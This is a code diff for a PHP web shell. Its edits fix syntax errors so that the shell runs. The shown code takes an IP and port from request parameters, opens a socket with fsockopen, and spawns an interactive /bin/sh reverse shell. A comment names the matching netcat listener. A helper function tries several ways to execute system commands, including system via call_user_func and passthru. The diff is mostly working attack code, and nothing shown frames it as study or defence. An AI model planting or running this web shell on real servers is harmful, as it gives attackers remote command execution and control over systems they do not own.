@@ -30,20 +30,22 @@ if(isset($_REQUEST[$cmd])) {
     # default port 443
     $port = '443';
     
-    if(isset($_REQUEST[$ip]){
+    if(isset($_REQUEST[$ip])){
         $port = $_REQUEST[$port];
     }
     
     # nc -nlvp 443
-    # https://www.php.net/manual/en/function.fsockopen.php
-    php -r '$sock=fsockopen($ip,$port);exec("/bin/sh -i <&3 >&3 2>&3");';
+    $sock = fsockopen($ip,$port);
+    $command = '/bin/sh -i <&3 >&3 2>&3';
+    
+    executeCommand($command);
         
 }
 
 die();
 
-fucntion executeCommand($command)
-{
+function executeCommand(string $command) {
+
      # Try to find a way to run our command using various PHP internals
     if (class_exists('ReflectionFunction')) {
 
@@ -61,7 +63,7 @@ fucntion executeCommand($command)
        # http://php.net/manual/en/function.call-user-func.php
        call_user_func('system', $command);
     
-    } else if(function_exists('passthru'))
+    } else if(function_exists('passthru')) {
         
         # https://www.php.net/manual/en/function.passthru.php
 		ob_start();
